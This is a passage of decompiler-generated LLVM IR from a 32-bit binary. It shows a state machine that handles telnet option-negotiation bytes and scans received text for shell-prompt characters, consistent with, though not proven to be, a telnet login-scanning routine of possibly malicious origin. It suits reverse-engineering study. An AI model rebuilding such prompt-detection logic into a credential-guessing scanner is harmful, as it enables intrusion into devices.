  %v1_804e41f = phi i32 [ %v1_804e41f.pre, %dec_label_pc_804e415.backedge.dec_label_pc_804e41c_crit_edge ], [ %v0_804e406, %dec_label_pc_804e415.preheader ]
  %v0_804e41c = phi i32 [ %v0_804e415, %dec_label_pc_804e415.backedge.dec_label_pc_804e41c_crit_edge ], [ %v0_804e41526, %dec_label_pc_804e415.preheader ]
  %v1_804e41c = add i32 %v0_804e41c, 28
  store i32 %v1_804e41c, i32* %eax.global-to-local, align 4
  %v2_804e41f = add i32 %v1_804e41f, 8
  %v3_804e41f = inttoptr i32 %v2_804e41f to i32*
  store i32 %v1_804e41c, i32* %v3_804e41f, align 4
  %v0_804e423 = load i32, i32* @edi, align 4
  %v1_804e423 = add i32 %v0_804e423, 24
  %v2_804e423 = inttoptr i32 %v1_804e423 to i32*
  %v3_804e423 = load i32, i32* %v2_804e423, align 4
  %v9_804e423 = icmp eq i32 %v3_804e423, 256
  br i1 %v9_804e423, label %dec_label_pc_804e9b9, label %dec_label_pc_804e430

dec_label_pc_804e430:                             ; preds = %dec_label_pc_804e41c, %dec_label_pc_804e9b9
  %v0_804e430 = load i32, i32* @esp, align 4
  %v1_804e430 = add i32 %v0_804e430, 24
  %v2_804e430 = inttoptr i32 %v1_804e430 to i32*
  %v3_804e430 = load i32, i32* %v2_804e430, align 4
  store i32 %v3_804e430, i32* %ecx.global-to-local, align 4
  %v1_804e434 = add i32 %v0_804e430, 8
  %v2_804e434 = inttoptr i32 %v1_804e434 to i32*
  %v3_804e434 = load i32, i32* %v2_804e434, align 4
  store i32 %v3_804e434, i32* %ebx.global-to-local, align 4
  store i32 256, i32* %eax.global-to-local, align 4
  %v1_804e43d = inttoptr i32 %v3_804e430 to i32*
  store i32 0, i32* %v1_804e43d, align 4
  %v0_804e443 = load i32, i32* @edi, align 4
  %v1_804e443 = add i32 %v0_804e443, 24
  %v2_804e443 = inttoptr i32 %v1_804e443 to i32*
  %v3_804e443 = load i32, i32* %v2_804e443, align 4
  store i32 %v3_804e443, i32* %edx.global-to-local, align 4
  %v0_804e446 = load i32, i32* @esp, align 4
  %v1_804e446 = add i32 %v0_804e446, -4
  %v2_804e446 = inttoptr i32 %v1_804e446 to i32*
  store i32 16384, i32* %v2_804e446, align 4
  %v0_804e44b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e44b = load i32, i32* %edx.global-to-local, align 4
  %v2_804e44b = add i32 %v1_804e44b, %v0_804e44b
  store i32 %v2_804e44b, i32* @ebx, align 4
  %v0_804e44d = load i32, i32* %eax.global-to-local, align 4
  %v2_804e44d = sub i32 %v0_804e44d, %v1_804e44b
  store i32 %v2_804e44d, i32* %eax.global-to-local, align 4
  %v2_804e44f = add i32 %v0_804e446, -8
  %v3_804e44f = inttoptr i32 %v2_804e44f to i32*
  store i32 %v2_804e44d, i32* %v3_804e44f, align 4
  %v0_804e450 = load i32, i32* @ebx, align 4
  %v2_804e450 = add i32 %v0_804e446, -12
  %v3_804e450 = inttoptr i32 %v2_804e450 to i32*
  store i32 %v0_804e450, i32* %v3_804e450, align 4
  %v0_804e451 = load i32, i32* @edi, align 4
  %v1_804e451 = add i32 %v0_804e451, 4
  %v2_804e451 = inttoptr i32 %v1_804e451 to i32*
  %v3_804e451 = load i32, i32* %v2_804e451, align 4
  store i32 %v3_804e451, i32* @esi, align 4
  %v2_804e454 = add i32 %v0_804e446, -16
  %v3_804e454 = inttoptr i32 %v2_804e454 to i32*
  store i32 %v3_804e451, i32* %v3_804e454, align 4
  %v0_804e455 = call i32 @function_8050170()
  store i32 %v0_804e455, i32* %eax.global-to-local, align 4
  %v0_804e45a = load i32, i32* @esp, align 4
  %v1_804e45a = add i32 %v0_804e45a, 16
  %tmp129 = icmp slt i32 %v0_804e455, 1
  br i1 %tmp129, label %dec_label_pc_804e8b3, label %dec_label_pc_804e466

dec_label_pc_804e466:                             ; preds = %dec_label_pc_804e430
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e468

dec_label_pc_804e468:                             ; preds = %dec_label_pc_804e472, %dec_label_pc_804e466
  %v0_804e46e = phi i32 [ %v1_804e472, %dec_label_pc_804e472 ], [ 0, %dec_label_pc_804e466 ]
  %v1_804e468 = load i32, i32* @ebx, align 4
  %v2_804e468 = add i32 %v1_804e468, %v0_804e46e
  %v3_804e468 = inttoptr i32 %v2_804e468 to i8*
  %v4_804e468 = load i8, i8* %v3_804e468, align 1
  %v5_804e468 = icmp eq i8 %v4_804e468, 0
  %v1_804e46c = icmp eq i1 %v5_804e468, false
  br i1 %v1_804e46c, label %dec_label_pc_804e472, label %dec_label_pc_804e46e

dec_label_pc_804e46e:                             ; preds = %dec_label_pc_804e468
  store i8 65, i8* %v3_804e468, align 1
  %v0_804e472.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e472

dec_label_pc_804e472:                             ; preds = %dec_label_pc_804e468, %dec_label_pc_804e46e
  %v0_804e472 = phi i32 [ %v0_804e46e, %dec_label_pc_804e468 ], [ %v0_804e472.pre, %dec_label_pc_804e46e ]
  %v1_804e472 = add i32 %v0_804e472, 1
  store i32 %v1_804e472, i32* %edx.global-to-local, align 4
  %v12_804e473 = icmp eq i32 %v0_804e455, %v1_804e472
  %v1_804e475 = icmp eq i1 %v12_804e473, false
  br i1 %v1_804e475, label %dec_label_pc_804e468, label %dec_label_pc_804e477

dec_label_pc_804e477:                             ; preds = %dec_label_pc_804e472, %dec_label_pc_804e8b9
  %v0_804e477 = load i32, i32* @edi, align 4
  %v1_804e477 = add i32 %v0_804e477, 24
  %v2_804e477 = inttoptr i32 %v1_804e477 to i32*
  %v3_804e477 = load i32, i32* %v2_804e477, align 4
  %v2_804e47a = add i32 %v3_804e477, %v0_804e455
  store i32 %v2_804e47a, i32* %edx.global-to-local, align 4
  %v0_804e47c = load i32, i32* @global_var_8053130.9, align 16
  store i32 %v0_804e47c, i32* %eax.global-to-local, align 4
  store i32 %v2_804e47a, i32* %v2_804e477, align 4
  %v0_804e484 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e484 = load i32, i32* @edi, align 4
  %v2_804e484 = add i32 %v1_804e484, 8
  %v3_804e484 = inttoptr i32 %v2_804e484 to i32*
  store i32 %v0_804e484, i32* %v3_804e484, align 4
  br label %dec_label_pc_804e487

dec_label_pc_804e487:                             ; preds = %dec_label_pc_804e783, %dec_label_pc_804e477
  %v0_804e487 = load i32, i32* @edi, align 4
  %v1_804e487 = add i32 %v0_804e487, 12
  %v2_804e487 = inttoptr i32 %v1_804e487 to i32*
  %v3_804e487 = load i32, i32* %v2_804e487, align 4
  store i32 %v3_804e487, i32* %eax.global-to-local, align 4
  switch i32 %v3_804e487, label %dec_label_pc_804e415.backedge [
    i32 2, label %dec_label_pc_804e497
    i32 3, label %dec_label_pc_804e52a
    i32 4, label %dec_label_pc_804e570
    i32 5, label %dec_label_pc_804e5b0
    i32 6, label %dec_label_pc_804e640
    i32 7, label %dec_label_pc_804e7a3
    i32 8, label %dec_label_pc_804e5f5
    i32 9, label %dec_label_pc_804e7e8
    i32 10, label %dec_label_pc_804e6f7
  ]

dec_label_pc_804e497:                             ; preds = %dec_label_pc_804e487
  %v0_804e497 = load i32, i32* @esp, align 4
  %v1_804e497 = add i32 %v0_804e497, 8
  %v2_804e497 = inttoptr i32 %v1_804e497 to i32*
  %v3_804e497 = load i32, i32* %v2_804e497, align 4
  store i32 %v3_804e497, i32* @ebx, align 4
  store i32 0, i32* @esi, align 4
  %v1_804e49d = add i32 %v0_804e487, 24
  %v2_804e49d = inttoptr i32 %v1_804e49d to i32*
  %v3_804e49d = load i32, i32* %v2_804e49d, align 4
  store i32 %v3_804e49d, i32* %edx.global-to-local, align 4
  %v2_804e4a017 = sub i32 0, %v3_804e49d
  %v10_804e4a021 = and i32 %v3_804e49d, %v2_804e4a017
  %v11_804e4a022 = icmp slt i32 %v10_804e4a021, 0
  %v13_804e4a024 = icmp slt i32 %v2_804e4a017, 0
  %v2_804e4a225 = icmp eq i1 %v13_804e4a024, %v11_804e4a022
  br i1 %v2_804e4a225, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804e4a4.preheader

dec_label_pc_804e4a4.preheader:                   ; preds = %dec_label_pc_804e497, %dec_label_pc_804e4a0.backedge
  %v0_804e51e118 = phi i32 [ %v0_804e51e120, %dec_label_pc_804e4a0.backedge ], [ %v0_804e487, %dec_label_pc_804e497 ]
  %v0_804e8a2111 = phi i32 [ %v0_804e4a0, %dec_label_pc_804e4a0.backedge ], [ 0, %dec_label_pc_804e497 ]
  %v5_804e4b6108 = phi i32 [ %v5_804e4b6109, %dec_label_pc_804e4a0.backedge ], [ 2, %dec_label_pc_804e497 ]
  %v1_804e4b0106 = phi i32 [ %v1_804e4a0, %dec_label_pc_804e4a0.backedge ], [ %v3_804e49d, %dec_label_pc_804e497 ]
  %v0_804e4a9103 = phi i32 [ %v0_804e4a9104, %dec_label_pc_804e4a0.backedge ], [ %v0_804e497, %dec_label_pc_804e497 ]
  br label %dec_label_pc_804e4a4

dec_label_pc_804e4a4:                             ; preds = %dec_label_pc_804e4a4.preheader, %dec_label_pc_804e4f5
  %v0_804e51e121 = phi i32 [ %v0_804e51e118, %dec_label_pc_804e4a4.preheader ], [ %v0_804e50c, %dec_label_pc_804e4f5 ]
  %v0_804e8a2 = phi i32 [ %v0_804e8a2111, %dec_label_pc_804e4a4.preheader ], [ %v0_804e512, %dec_label_pc_804e4f5 ]
  %v5_804e4b6 = phi i32 [ %v5_804e4b6108, %dec_label_pc_804e4a4.preheader ], [ %v0_804e507, %dec_label_pc_804e4f5 ]
  %v1_804e4b0 = phi i32 [ %v1_804e4b0106, %dec_label_pc_804e4a4.preheader ], [ %v3_804e50c, %dec_label_pc_804e4f5 ]
  %v0_804e918 = phi i32 [ %v0_804e4a9103, %dec_label_pc_804e4a4.preheader ], [ %v1_804e50f, %dec_label_pc_804e4f5 ]
  %v0_804e4a4 = load i32, i32* @ebx, align 4
  %v1_804e4a4 = inttoptr i32 %v0_804e4a4 to i8*
  %v2_804e4a4 = load i8, i8* %v1_804e4a4, align 1
  %v12_804e4a4 = icmp eq i8 %v2_804e4a4, -1
  %v1_804e4a7 = icmp eq i1 %v12_804e4a4, false
  br i1 %v1_804e4a7, label %dec_label_pc_804e516, label %dec_label_pc_804e4a9

dec_label_pc_804e4a9:                             ; preds = %dec_label_pc_804e4a4
  %v1_804e4a9 = add i32 %v0_804e918, 8
  %v2_804e4a9 = inttoptr i32 %v1_804e4a9 to i32*
  %v3_804e4a9 = load i32, i32* %v2_804e4a9, align 4
  %v1_804e4ad = add i32 %v0_804e4a4, 1
  store i32 %v1_804e4ad, i32* %ecx.global-to-local, align 4
  %v2_804e4b0 = add i32 %v3_804e4a9, %v1_804e4b0
  %tmp305 = icmp ugt i32 %v2_804e4b0, %v1_804e4ad
  br i1 %tmp305, label %dec_label_pc_804e4b6, label %dec_label_pc_804e516

dec_label_pc_804e4b6:                             ; preds = %dec_label_pc_804e4a9
  %v2_804e4b6 = inttoptr i32 %v1_804e4ad to i8*
  %v3_804e4b6 = load i8, i8* %v2_804e4b6, align 1
  %v4_804e4b6 = zext i8 %v3_804e4b6 to i32
  %v6_804e4b6 = and i32 %v5_804e4b6, -256
  %v7_804e4b6 = or i32 %v4_804e4b6, %v6_804e4b6
  store i32 %v7_804e4b6, i32* %eax.global-to-local, align 4
  switch i8 %v3_804e4b6, label %dec_label_pc_804e4c9 [
    i8 -1, label %dec_label_pc_804e89f
    i8 -3, label %dec_label_pc_804e918
  ]

dec_label_pc_804e4c9:                             ; preds = %dec_label_pc_804e4b6
  %v1_804e4c9 = add i32 %v0_804e4a4, 2
  store i32 %v1_804e4c9, i32* %eax.global-to-local, align 4
  %tmp306 = icmp ugt i32 %v2_804e4b0, %v1_804e4c9
  br i1 %tmp306, label %dec_label_pc_804e4d0, label %dec_label_pc_804e516

dec_label_pc_804e4d0:                             ; preds = %dec_label_pc_804e4c9, %dec_label_pc_804ef8a, %dec_label_pc_804ef92, %dec_label_pc_804e9a0
  %v0_804e4d0 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804e4d0 = inttoptr i32 %v0_804e4d0 to i8*
  %v2_804e4d0 = load i8, i8* %v1_804e4d0, align 1
  %v3_804e4d0 = zext i8 %v2_804e4d0 to i32
  %v4_804e4d0 = load i32, i32* %eax.global-to-local, align 4
  %v5_804e4d0 = and i32 %v4_804e4d0, -256
  %v6_804e4d0 = or i32 %v5_804e4d0, %v3_804e4d0
  store i32 %v6_804e4d0, i32* %eax.global-to-local, align 4
  switch i8 %v2_804e4d0, label %dec_label_pc_804e4e2 [
    i8 -3, label %dec_label_pc_804e910
    i8 -5, label %dec_label_pc_804e9b1
  ]

dec_label_pc_804e4e2:                             ; preds = %dec_label_pc_804e4d0, %dec_label_pc_804e9b1, %dec_label_pc_804e910
  %v0_804e4e2 = load i32, i32* @ebx, align 4
  %v1_804e4e2 = add i32 %v0_804e4e2, 2
  %v2_804e4e2 = inttoptr i32 %v1_804e4e2 to i8*
  %v3_804e4e2 = load i8, i8* %v2_804e4e2, align 1
  %v4_804e4e2 = zext i8 %v3_804e4e2 to i32
  %v5_804e4e2 = load i32, i32* %eax.global-to-local, align 4
  %v6_804e4e2 = and i32 %v5_804e4e2, -256
  %v7_804e4e2 = or i32 %v6_804e4e2, %v4_804e4e2
  store i32 %v7_804e4e2, i32* %eax.global-to-local, align 4
  switch i8 %v3_804e4e2, label %dec_label_pc_804e4f5 [
    i8 -3, label %dec_label_pc_804e8aa
    i8 -5, label %dec_label_pc_804e9a8
  ]

dec_label_pc_804e4f5:                             ; preds = %dec_label_pc_804e4e2, %dec_label_pc_804e9a8, %dec_label_pc_804e8aa
  %v0_804e4f5 = load i32, i32* @esp, align 4
  %v1_804e4f5 = add i32 %v0_804e4f5, -4
  %v2_804e4f5 = inttoptr i32 %v1_804e4f5 to i32*
  store i32 16384, i32* %v2_804e4f5, align 4
  %v1_804e4fa = add i32 %v0_804e4f5, -8
  %v2_804e4fa = inttoptr i32 %v1_804e4fa to i32*
  store i32 3, i32* %v2_804e4fa, align 4
  %v0_804e4fc = load i32, i32* @ebx, align 4
  %v2_804e4fc = add i32 %v0_804e4f5, -12
  %v3_804e4fc = inttoptr i32 %v2_804e4fc to i32*
  store i32 %v0_804e4fc, i32* %v3_804e4fc, align 4
  %v0_804e4fd = load i32, i32* @esi, align 4
  %v1_804e4fd = add i32 %v0_804e4fd, 3
  store i32 %v1_804e4fd, i32* @esi, align 4
  %v0_804e500 = load i32, i32* @edi, align 4
  %v1_804e500 = add i32 %v0_804e500, 4
  %v2_804e500 = inttoptr i32 %v1_804e500 to i32*
  %v3_804e500 = load i32, i32* %v2_804e500, align 4
  %v0_804e503 = load i32, i32* @ebx, align 4
  %v1_804e503 = add i32 %v0_804e503, 3
  store i32 %v1_804e503, i32* @ebx, align 4
  %v2_804e506 = add i32 %v0_804e4f5, -16
  %v3_804e506 = inttoptr i32 %v2_804e506 to i32*
  store i32 %v3_804e500, i32* %v3_804e506, align 4
  %v0_804e507 = call i32 @function_80501e6()
  store i32 %v0_804e507, i32* %eax.global-to-local, align 4
  %v0_804e50c = load i32, i32* @edi, align 4
  %v1_804e50c = add i32 %v0_804e50c, 24
  %v2_804e50c = inttoptr i32 %v1_804e50c to i32*
  %v3_804e50c = load i32, i32* %v2_804e50c, align 4
  store i32 %v3_804e50c, i32* %edx.global-to-local, align 4
  %v0_804e50f = load i32, i32* @esp, align 4
  %v1_804e50f = add i32 %v0_804e50f, 16
  %v0_804e512 = load i32, i32* @esi, align 4
  %v2_804e512 = sub i32 %v0_804e512, %v3_804e50c
  %v8_804e512 = xor i32 %v0_804e512, %v3_804e50c
  %v9_804e512 = xor i32 %v2_804e512, %v0_804e512
  %v10_804e512 = and i32 %v9_804e512, %v8_804e512
  %v11_804e512 = icmp slt i32 %v10_804e512, 0
  %v13_804e512 = icmp slt i32 %v2_804e512, 0
  %v2_804e514 = icmp eq i1 %v13_804e512, %v11_804e512
  br i1 %v2_804e514, label %dec_label_pc_804e516, label %dec_label_pc_804e4a4

dec_label_pc_804e516:                             ; preds = %dec_label_pc_804e4a0.backedge, %dec_label_pc_804e4c9, %dec_label_pc_804e4a9, %dec_label_pc_804e4f5, %dec_label_pc_804e4a4, %dec_label_pc_804e918.dec_label_pc_804e516.loopexit_crit_edge
  %v0_804e51e = phi i32 [ %v0_804e97c, %dec_label_pc_804e918.dec_label_pc_804e516.loopexit_crit_edge ], [ %v0_804e50c, %dec_label_pc_804e4f5 ], [ %v0_804e51e121, %dec_label_pc_804e4c9 ], [ %v0_804e51e121, %dec_label_pc_804e4a9 ], [ %v0_804e51e121, %dec_label_pc_804e4a4 ], [ %v0_804e51e120, %dec_label_pc_804e4a0.backedge ]
  %v0_804e516 = phi i32 [ %v0_804e516.pre.pre, %dec_label_pc_804e918.dec_label_pc_804e516.loopexit_crit_edge ], [ %v0_804e512, %dec_label_pc_804e4f5 ], [ %v0_804e8a2, %dec_label_pc_804e4c9 ], [ %v0_804e8a2, %dec_label_pc_804e4a9 ], [ %v0_804e8a2, %dec_label_pc_804e4a4 ], [ %v0_804e4a0, %dec_label_pc_804e4a0.backedge ]
  %tmp130 = icmp slt i32 %v0_804e516, 1
  br i1 %tmp130, label %dec_label_pc_804ea89, label %dec_label_pc_804e51e

dec_label_pc_804e51e:                             ; preds = %dec_label_pc_804e516
  %v1_804e51e = add i32 %v0_804e51e, 12
  %v2_804e51e = inttoptr i32 %v1_804e51e to i32*
  store i32 3, i32* %v2_804e51e, align 4
  br label %dec_label_pc_804e778

dec_label_pc_804e52a:                             ; preds = %dec_label_pc_804e487
  %v1_804e52a = add i32 %v0_804e487, 24
  %v2_804e52a = inttoptr i32 %v1_804e52a to i32*
  %v3_804e52a = load i32, i32* %v2_804e52a, align 4
  %v1_804e52d = add i32 %v3_804e52a, -1
  store i32 %v1_804e52d, i32* %eax.global-to-local, align 4
  %tmp131 = icmp slt i32 %v1_804e52d, 1
  br i1 %tmp131, label %dec_label_pc_804eb17, label %dec_label_pc_804e536.preheader

dec_label_pc_804e536.preheader:                   ; preds = %dec_label_pc_804e52a
  %v7_804e536.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804e536 = add i32 %v0_804e487, 28
  br label %dec_label_pc_804e536

dec_label_pc_804e536:                             ; preds = %dec_label_pc_804e536.preheader, %dec_label_pc_804e567
  %v7_804e536 = phi i32 [ %v7_804e536.pre, %dec_label_pc_804e536.preheader ], [ %v9_804e536, %dec_label_pc_804e567 ]
  %v0_804eb0b = phi i32 [ %v1_804e52d, %dec_label_pc_804e536.preheader ], [ %v1_804e567, %dec_label_pc_804e567 ]
  %v3_804e536 = add i32 %v2_804e536, %v0_804eb0b
  %v4_804e536 = inttoptr i32 %v3_804e536 to i8*
  %v5_804e536 = load i8, i8* %v4_804e536, align 1
  %v6_804e536 = zext i8 %v5_804e536 to i32
  %v8_804e536 = and i32 %v7_804e536, -256
  %v9_804e536 = or i32 %v6_804e536, %v8_804e536
  store i32 %v9_804e536, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e536, label %dec_label_pc_804e567 [
    i8 58, label %dec_label_pc_804eb0b
    i8 62, label %dec_label_pc_804eb0b
    i8 36, label %dec_label_pc_804eb0b
    i8 35, label %dec_label_pc_804eb0b
    i8 37, label %dec_label_pc_804eb0b
  ]

dec_label_pc_804e567:                             ; preds = %dec_label_pc_804e536
  %v1_804e567 = add i32 %v0_804eb0b, -1
  %v8_804e567 = icmp eq i32 %v1_804e567, 0
  store i32 %v1_804e567, i32* %eax.global-to-local, align 4
  %v1_804e568 = icmp eq i1 %v8_804e567, false
  br i1 %v1_804e568, label %dec_label_pc_804e536, label %dec_label_pc_804eb17

dec_label_pc_804e570:                             ; preds = %dec_label_pc_804e487
  %v1_804e570 = add i32 %v0_804e487, 24
  %v2_804e570 = inttoptr i32 %v1_804e570 to i32*
  %v3_804e570 = load i32, i32* %v2_804e570, align 4
  %v1_804e573 = add i32 %v3_804e570, -1
  store i32 %v1_804e573, i32* %eax.global-to-local, align 4
  %tmp132 = icmp slt i32 %v1_804e573, 1
  br i1 %tmp132, label %dec_label_pc_804e9e8, label %dec_label_pc_804e57c.preheader

dec_label_pc_804e57c.preheader:                   ; preds = %dec_label_pc_804e570
  %v7_804e57c.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804e57c = add i32 %v0_804e487, 28
  br label %dec_label_pc_804e57c

dec_label_pc_804e57c:                             ; preds = %dec_label_pc_804e57c.preheader, %dec_label_pc_804e5a4
  %v7_804e57c = phi i32 [ %v7_804e57c.pre, %dec_label_pc_804e57c.preheader ], [ %v9_804e57c, %dec_label_pc_804e5a4 ]
  %v0_804e9dc = phi i32 [ %v1_804e573, %dec_label_pc_804e57c.preheader ], [ %v1_804e5a4, %dec_label_pc_804e5a4 ]
  %v3_804e57c = add i32 %v2_804e57c, %v0_804e9dc
  %v4_804e57c = inttoptr i32 %v3_804e57c to i8*
  %v5_804e57c = load i8, i8* %v4_804e57c, align 1
  %v6_804e57c = zext i8 %v5_804e57c to i32
  %v8_804e57c = and i32 %v7_804e57c, -256
  %v9_804e57c = or i32 %v6_804e57c, %v8_804e57c
  store i32 %v9_804e57c, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e57c, label %dec_label_pc_804e5a4 [
    i8 58, label %dec_label_pc_804e9dc
    i8 62, label %dec_label_pc_804e9dc
    i8 36, label %dec_label_pc_804e9dc
    i8 35, label %dec_label_pc_804e9dc
  ]

dec_label_pc_804e5a4:                             ; preds = %dec_label_pc_804e57c
  %v1_804e5a4 = add i32 %v0_804e9dc, -1
  %v8_804e5a4 = icmp eq i32 %v1_804e5a4, 0
  store i32 %v1_804e5a4, i32* %eax.global-to-local, align 4
  %v1_804e5a5 = icmp eq i1 %v8_804e5a4, false
  br i1 %v1_804e5a5, label %dec_label_pc_804e57c, label %dec_label_pc_804e9e8

dec_label_pc_804e5b0:                             ; preds = %dec_label_pc_804e487
  %v1_804e5b0 = add i32 %v0_804e487, 24
  %v2_804e5b0 = inttoptr i32 %v1_804e5b0 to i32*
  %v3_804e5b0 = load i32, i32* %v2_804e5b0, align 4
  %v1_804e5b3 = add i32 %v3_804e5b0, -1
  store i32 %v1_804e5b3, i32* %eax.global-to-local, align 4
  %tmp133 = icmp slt i32 %v1_804e5b3, 1
  br i1 %tmp133, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804e5bc.preheader

dec_label_pc_804e5bc.preheader:                   ; preds = %dec_label_pc_804e5b0
  %v7_804e5bc.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804e5bc = add i32 %v0_804e487, 28
  br label %dec_label_pc_804e5bc

dec_label_pc_804e5bc:                             ; preds = %dec_label_pc_804e5bc.preheader, %dec_label_pc_804e5ed
  %v7_804e5bc = phi i32 [ %v7_804e5bc.pre, %dec_label_pc_804e5bc.preheader ], [ %v9_804e5bc, %dec_label_pc_804e5ed ]
  %v0_804ece4 = phi i32 [ %v1_804e5b3, %dec_label_pc_804e5bc.preheader ], [ %v1_804e5ed, %dec_label_pc_804e5ed ]
  %v3_804e5bc = add i32 %v2_804e5bc, %v0_804ece4
  %v4_804e5bc = inttoptr i32 %v3_804e5bc to i8*
  %v5_804e5bc = load i8, i8* %v4_804e5bc, align 1
  %v6_804e5bc = zext i8 %v5_804e5bc to i32
  %v8_804e5bc = and i32 %v7_804e5bc, -256
  %v9_804e5bc = or i32 %v6_804e5bc, %v8_804e5bc
  store i32 %v9_804e5bc, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e5bc, label %dec_label_pc_804e5ed [
    i8 58, label %dec_label_pc_804ece4
    i8 62, label %dec_label_pc_804ece4
    i8 36, label %dec_label_pc_804ece4
    i8 35, label %dec_label_pc_804ece4
    i8 37, label %dec_label_pc_804ece4
  ]

dec_label_pc_804e5ed:                             ; preds = %dec_label_pc_804e5bc
  %v1_804e5ed = add i32 %v0_804ece4, -1
  %v8_804e5ed = icmp eq i32 %v1_804e5ed, 0
  store i32 %v1_804e5ed, i32* %eax.global-to-local, align 4
  %v1_804e5ee = icmp eq i1 %v8_804e5ed, false
  br i1 %v1_804e5ee, label %dec_label_pc_804e5bc, label %dec_label_pc_804e415.backedge

dec_label_pc_804e5f5:                             ; preds = %dec_label_pc_804e487
  %v1_804e5f5 = add i32 %v0_804e487, 24
  %v2_804e5f5 = inttoptr i32 %v1_804e5f5 to i32*
  %v3_804e5f5 = load i32, i32* %v2_804e5f5, align 4
  %v1_804e5f8 = add i32 %v3_804e5f5, -1
  store i32 %v1_804e5f8, i32* %eax.global-to-local, align 4
  %tmp134 = icmp slt i32 %v1_804e5f8, 1
  br i1 %tmp134, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804e601.preheader

dec_label_pc_804e601.preheader:                   ; preds = %dec_label_pc_804e5f5
  %v7_804e601.pre = load i32, i32* %edx.global-to-local, align 4
  %v2_804e601 = add i32 %v0_804e487, 28
  br label %dec_label_pc_804e601

dec_label_pc_804e601:                             ; preds = %dec_label_pc_804e601.preheader, %dec_label_pc_804e632
  %v7_804e601 = phi i32 [ %v7_804e601.pre, %dec_label_pc_804e601.preheader ], [ %v9_804e601, %dec_label_pc_804e632 ]
  %v0_804ea96 = phi i32 [ %v1_804e5f8, %dec_label_pc_804e601.preheader ], [ %v1_804e632, %dec_label_pc_804e632 ]
  %v3_804e601 = add i32 %v2_804e601, %v0_804ea96
  %v4_804e601 = inttoptr i32 %v3_804e601 to i8*
  %v5_804e601 = load i8, i8* %v4_804e601, align 1
  %v6_804e601 = zext i8 %v5_804e601 to i32
  %v8_804e601 = and i32 %v7_804e601, -256
  %v9_804e601 = or i32 %v6_804e601, %v8_804e601
  store i32 %v9_804e601, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e601, label %dec_label_pc_804e632 [
    i8 58, label %dec_label_pc_804ea96
    i8 62, label %dec_label_pc_804ea96
    i8 36, label %dec_label_pc_804ea96
    i8 35, label %dec_label_pc_804ea96
    i8 37, label %dec_label_pc_804ea96
  ]

dec_label_pc_804e632:                             ; preds = %dec_label_pc_804e601
  %v1_804e632 = add i32 %v0_804ea96, -1
  %v8_804e632 = icmp eq i32 %v1_804e632, 0
  store i32 %v1_804e632, i32* %eax.global-to-local, align 4
  %v1_804e633 = icmp eq i1 %v8_804e632, false
  br i1 %v1_804e633, label %dec_label_pc_804e601, label %dec_label_pc_804e415.backedge

dec_label_pc_804e640:                             ; preds = %dec_label_pc_804e487
  %v1_804e640 = add i32 %v0_804e487, 24
  %v2_804e640 = inttoptr i32 %v1_804e640 to i32*
  %v3_804e640 = load i32, i32* %v2_804e640, align 4
  %v1_804e643 = add i32 %v3_804e640, -1
  store i32 %v1_804e643, i32* %eax.global-to-local, align 4
  %tmp135 = icmp slt i32 %v1_804e643, 1
  br i1 %tmp135, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804e64c

dec_label_pc_804e64c:                             ; preds = %dec_label_pc_804e640
  %v2_804e64c = add i32 %v0_804e487, 27
  %v3_804e64c = add i32 %v2_804e64c, %v3_804e640
  %v4_804e64c = inttoptr i32 %v3_804e64c to i8*
  %v5_804e64c = load i8, i8* %v4_804e64c, align 1
  %v6_804e64c = zext i8 %v5_804e64c to i32
  %v7_804e64c = load i32, i32* %edx.global-to-local, align 4
  %v8_804e64c = and i32 %v7_804e64c, -256
  %v9_804e64c = or i32 %v8_804e64c, %v6_804e64c
  store i32 %v9_804e64c, i32* %edx.global-to-local, align 4
  switch i8 %v5_804e64c, label %dec_label_pc_804e65a [
    i8 62, label %dec_label_pc_804e67e.thread
    i8 58, label %dec_label_pc_804e67e.thread
  ]

dec_label_pc_804e65a:                             ; preds = %dec_label_pc_804e64c, %dec_label_pc_804e670
  %v0_804e669 = phi i32 [ %v1_804e669, %dec_label_pc_804e670 ], [ %v1_804e643, %dec_label_pc_804e64c ]
  %v7_804e670 = phi i32 [ %v9_804e670, %dec_label_pc_804e670 ], [ %v9_804e64c, %dec_label_pc_804e64c ]
  %v1_804e65a = trunc i32 %v7_804e670 to i8
  %v1_804e65a.off = add i8 %v1_804e65a, -35
  %switch167 = icmp ult i8 %v1_804e65a.off, 3
  br i1 %switch167, label %dec_label_pc_804e67e, label %dec_label_pc_804e669

dec_label_pc_804e669:                             ; preds = %dec_label_pc_804e65a
  %v1_804e669 = add i32 %v0_804e669, -1
  %v8_804e669 = icmp eq i32 %v1_804e669, 0
  store i32 %v1_804e669, i32* %eax.global-to-local, align 4
  br i1 %v8_804e669, label %dec_label_pc_804e415.backedge, label %dec_label_pc_804e670

dec_label_pc_804e670:                             ; preds = %dec_label_pc_804e669
  %v3_804e670 = add i32 %v2_804e64c, %v0_804e669
  %v4_804e670 = inttoptr i32 %v3_804e670 to i8*
  %v5_804e670 = load i8, i8* %v4_804e670, align 1
  %v6_804e670 = zext i8 %v5_804e670 to i32
  %v8_804e670 = and i32 %v7_804e670, -256
  %v9_804e670 = or i32 %v6_804e670, %v8_804e670
  store i32 %v9_804e670, i32* %edx.global-to-local, align 4
  %v10_804e674 = icmp ne i8 %v5_804e670, 58
  %v10_804e679 = icmp eq i8 %v5_804e670, 62
  %v1_804e67c = icmp eq i1 %v10_804e679, false
  %or.cond165 = and i1 %v10_804e674, %v1_804e67c
  br i1 %or.cond165, label %dec_label_pc_804e65a, label %dec_label_pc_804e67e

dec_label_pc_804e67e.thread:                      ; preds = %dec_label_pc_804e64c, %dec_label_pc_804e64c
  store i32 %v3_804e640, i32* @esi, align 4
  br label %dec_label_pc_804e68a

dec_label_pc_804e67e:                             ; preds = %dec_label_pc_804e65a, %dec_label_pc_804e670
